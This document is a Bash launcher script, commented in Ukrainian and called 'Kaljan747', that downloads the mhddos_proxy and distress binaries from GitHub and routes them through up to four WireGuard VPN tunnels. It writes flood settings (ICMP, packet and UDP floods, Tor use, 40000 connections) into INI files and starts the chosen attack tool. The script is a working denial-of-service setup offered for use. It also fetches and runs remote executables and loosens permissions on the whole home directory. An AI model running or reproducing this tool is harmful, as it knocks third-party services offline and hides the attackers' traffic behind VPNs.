#!/bin/bash
set -e

# === Функції для кольорового виведення ===
print_header() {
    echo -e "\e[1;36m========================================"
    echo -e "🚀  Запуск Kaljan747"
    echo -e "========================================\e[0m"
}

print_summary() {
    echo -e "\n\e[1;33m----------------------------------------"
    echo -e "📦  Встановлення залежностей: \e[1;32mOK\e[0m"
    echo -e "🌍  Завантаження WG-конфігів: \e[1;32mOK\e[0m"
    echo -e "⚙️  Запуск модуля: PID $1"
    echo -e "----------------------------------------\e[0m"

    echo -e "\n📨  Email-звіт буде надсилатись кожні 4 год. на \e[1;35muser@example.com\e[0m"
}

print_stage() {
    echo -e "\e[1;34m$1\e[0m"
}

# === Шляхи до файлів ===
SETTINGS_FILE="$HOME/.kaljan747_settings"
LOG_DIR="$HOME/logs"
LOG_FILE="$LOG_DIR/wg.log"
MODULE_DIR="$HOME/modules"
WG_DIR="$HOME/wg_confs"
mkdir -p "$LOG_DIR" "$MODULE_DIR" "$WG_DIR"
touch "$LOG_FILE"

# === Встановлення прав доступу ===
set_permissions() {
    echo -e "\n📁  Встановлюю права доступу до папок і файлів..."
    sudo chmod -R 755 $HOME
    sudo chmod -R 755 $MODULE_DIR
    sudo chmod -R 755 $WG_DIR
    sudo chmod +x $MODULE_DIR/mhddos_proxy
    sudo chmod +x $MODULE_DIR/distress
    sudo chmod 644 $MODULE_DIR/mhddos.ini
    sudo chmod 644 $MODULE_DIR/distress.ini
    sudo chown -R $USER:$USER $HOME
    echo -e "✅ Права доступу встановлено."
}

# === Функції для запиту ===
ask_user_id() {
    if [ -n "$DISPLAY" ] && command -v zenity >/dev/null 2>&1; then
        USER_ID=$(zenity --entry --title="Введення USER-ID" --text="Введіть ваш user-id (тільки цифри):" --width=400)
    else
        read -p "Введіть ваш user-id (тільки цифри): " USER_ID
    fi
}

ask_run_parameters() {
    if [ -n "$DISPLAY" ] && command -v zenity >/dev/null 2>&1; then
        USER_SELECTION=$(zenity --forms --title="Kaljan747 Конфігурація" \
            --text="Вкажіть параметри запуску" \
            --add-combo="Модуль" --combo-values="mhddos_proxy|distress" \
            --add-combo="Редагувати INI перед запуском?" --combo-values="Так|Ні" \
            --add-combo="Режим запуску" --combo-values="screen у фоні|screen відкрито|без screen" \
            --width=400)

        [ -z "$USER_SELECTION" ] && { echo "Запуск скасовано"; exit 1; }
        IFS="|" read -r SELECTED_MODULE EDIT_INI SELECTED_RUN_MODE <<< "$USER_SELECTION"
    else
        echo "Виберіть модуль:"
        echo "1) mhddos_proxy"
        echo "2) distress"
        read -p "Ваш вибір (1/2): " mod_choice
        SELECTED_MODULE=$( [ "$mod_choice" = "1" ] && echo "mhddos_proxy" || echo "distress" )

        echo "Редагувати INI перед запуском?"
        echo "1) Так"
        echo "2) Ні"
        read -p "Ваш вибір (1/2): " edit_choice
        EDIT_INI=$( [ "$edit_choice" = "1" ] && echo "Так" || echo "Ні" )

        echo "Виберіть режим запуску:"
        echo "1) screen у фоні"
        echo "2) screen відкрито"
        echo "3) без screen"
        read -p "Ваш вибір (1/2/3): " run_choice
        case "$run_choice" in
            1) SELECTED_RUN_MODE="screen у фоні";;
            2) SELECTED_RUN_MODE="screen відкрито";;
            3) SELECTED_RUN_MODE="без screen";;
        esac
    fi
}

# === Завантаження або запит налаштувань ===
if [ -f "$SETTINGS_FILE" ]; then
    source "$SETTINGS_FILE"
fi

if [ -z "$USER_ID" ]; then
    while true; do
        ask_user_id
        if [ -z "$USER_ID" ]; then
            echo "User-id обов'язковий. Завершення."
            exit 1
        fi
        if [[ "$USER_ID" =~ ^[0-9]+$ ]]; then
            break
        else
            echo "Помилка: USER-ID має містити тільки цифри!"
        fi
    done
fi

if [ -z "$SELECTED_MODULE" ] || [ -z "$EDIT_INI" ] || [ -z "$SELECTED_RUN_MODE" ]; then
    ask_run_parameters
fi

print_header
echo -e "📥  Отримано USER-ID: \e[1;32m$USER_ID\e[0m"
echo -e "🧩  Обраний модуль: \e[1;36m$SELECTED_MODULE\e[0m"
echo -e "🛠️  Режим запуску: \e[1;36m$SELECTED_RUN_MODE\e[0m"

# Встановлення прав доступу
set_permissions

# === Перевірка sudo ===
if [ "$(id -u)" -eq 0 ]; then
    SUDO=""
else
    if command -v sudo >/dev/null 2>&1; then
        SUDO="sudo"
    else
        echo "sudo не знайдено. Встановіть або увійдіть як root."
        exit 1
    fi
fi

# === Встановлення залежностей ===
$SUDO apt update -y
$SUDO apt install -y curl wget git screen sed wireguard zenity

# === Завантаження модулів ===
echo "[+] Завантаження модулів..."
MH_URL="https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download/mhddos_proxy_linux"
DS_URL="https://github.com/Yneth/distress-releases/releases/latest/download/distress_x86_64-unknown-linux-musl"
[ -f "$MODULE_DIR/mhddos_proxy" ] || wget -qO "$MODULE_DIR/mhddos_proxy" "$MH_URL"
[ -f "$MODULE_DIR/distress" ] || wget -qO "$MODULE_DIR/distress" "$DS_URL"
chmod +x "$MODULE_DIR/mhddos_proxy" "$MODULE_DIR/distress"

# === ЗУПИНКА ВСІХ WG ПЕРЕД ЗАПУСКОМ ===
for iface in $(wg show interfaces 2>/dev/null); do
    $SUDO wg-quick down "$iface" 2>/dev/null || true
    $SUDO ip link delete "$iface" 2>/dev/null || true
done

# =====================================================================
# === НОВИЙ БЛОК "ЗАВАНТАЖЕННЯ WG-КОНФІГІВ ЧЕРЕЗ GIT CLONE" ============
# =====================================================================

print_stage "🌍 Завантаження WG-конфігів (через git clone)..."

TMPDIR="$(mktemp -d)"
if git clone --depth 1 --branch k7771 https://github.com/k7771/Kaljan747.git "$TMPDIR"; then
    mkdir -p "$WG_DIR"
    if cp -r "$TMPDIR"/wg/* "$WG_DIR"/ 2>/dev/null; then
        echo "✅ Конфіги скопійовано до $WG_DIR"
    else
        echo "❌ Папка wg пуста або відсутня у репозиторії!"
        rm -rf "$TMPDIR"
        exit 1
    fi
else
    echo "❌ Не вдалося клонувати репозиторій!"
    rm -rf "$TMPDIR"
    exit 1
fi

rm -rf "$TMPDIR"
$SUDO chmod 600 "$WG_DIR"/*.conf 2>/dev/null || true

# =====================================================================


# === ПІДКЛЮЧЕННЯ 4 РОБОЧИХ ТУНЕЛІВ ===
check_wg_connection() {
    curl -s --interface "$1" --max-time 5 https://api.ipify.org >/dev/null 2>&1
}

WG_FILES=($(find "$WG_DIR" -name "*.conf" -type f | shuf))
WG_IFACES=()
INDEX=0

while [ "${#WG_IFACES[@]}" -lt 4 ] && [ "$INDEX" -lt "${#WG_FILES[@]}" ]; do
    conf="${WG_FILES[$INDEX]}"
    IFACE_NAME=$(basename "$conf" .conf)
    $SUDO wg-quick up "$conf" 2>/dev/null || true
    sleep 2
    if check_wg_connection "$IFACE_NAME"; then
        echo "[+] Інтерфейс $IFACE_NAME працює."
        echo "$(date '+%Y-%m-%d %H:%M:%S') [+] Інтерфейс $IFACE_NAME працює." >> "$LOG_FILE"
        WG_IFACES+=("$IFACE_NAME")
    else
        echo "[-] Інтерфейс $IFACE_NAME не працює. Відключаю."
        echo "$(date '+%Y-%m-%d %H:%M:%S') [-] Інтерфейс $IFACE_NAME не працює. Відключено." >> "$LOG_FILE"
        $SUDO wg-quick down "$IFACE_NAME" 2>/dev/null || true
        $SUDO ip link delete "$IFACE_NAME" 2>/dev/null || true
    fi
    INDEX=$((INDEX+1))
done

VPN_LIST=$(IFS=' '; echo "${WG_IFACES[*]}")
VPN_LIST_COMMAS=$(IFS=','; echo "${WG_IFACES[*]}")

# === ОНОВЛЕННЯ INI ===
echo "--use-my-ip 0 --copies auto -t 8000 --ifaces $VPN_LIST --user-id=$USER_ID" > "$MODULE_DIR/mhddos.ini"
echo "--use-my-ip 0 --enable-icmp-flood --enable-packet-flood --direct-udp-mixed-flood --use-tor 30 --disable-auto-update -c 40000 --interface=$VPN_LIST_COMMAS --user-id=$USER_ID" > "$MODULE_DIR/distress.ini"

CONFIG_FILE="$MODULE_DIR/mhddos.ini"
[ "$SELECTED_MODULE" = "distress" ] && CONFIG_FILE="$MODULE_DIR/distress.ini"

if [ "$EDIT_INI" = "Так" ]; then
    if [ -n "$DISPLAY" ]; then
        zenity --text-info --editable --filename="$CONFIG_FILE" --title="Редагування INI" > "$CONFIG_FILE.tmp"
        mv "$CONFIG_FILE.tmp" "$CONFIG_FILE"
    else
        nano "$CONFIG_FILE"
    fi
fi

# === ЗАПУСК МОДУЛЯ ===
MODULE_EXEC="$MODULE_DIR/mhddos_proxy"
[ "$SELECTED_MODULE" = "distress" ] && MODULE_EXEC="$MODULE_DIR/distress"

case "$SELECTED_RUN_MODE" in
    "screen у фоні") screen -dmS "$SELECTED_MODULE" "$MODULE_EXEC" $(cat "$CONFIG_FILE"); PID=$(pgrep -f "$MODULE_EXEC") ;;
    "screen відкрито") screen -S "$SELECTED_MODULE" "$MODULE_EXEC" $(cat "$CONFIG_FILE"); PID=$(pgrep -f "$MODULE_EXEC") ;;
    "без screen") "$MODULE_EXEC" $(cat "$CONFIG_FILE") & PID=$! ;;
esac

print_summary "$PID"
exit 0
